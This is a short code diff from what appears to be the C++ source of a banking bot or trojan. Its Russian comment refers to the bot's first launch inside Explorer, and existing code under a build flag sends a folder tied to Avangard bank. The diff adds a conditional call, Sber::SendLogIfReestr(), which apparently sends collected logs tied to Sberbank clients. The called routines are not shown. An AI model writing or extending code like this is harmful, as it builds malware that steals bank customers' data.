@@ -25,6 +25,10 @@ void ExplorerFirstStart(PEventData Data)
 		AvangardWeb::SendFolder_avn_ib();
 	#endif
 	
+	#ifdef SBERH
+		Sber::SendLogIfReestr();
+	#endif
+
 	//ExecuteDocFind( 0, 0, 0 );
 	//ExecuteLoadDLLDisk( 0, 0, "testdll.dll" );
 	// Первый запуск бота в проводнике
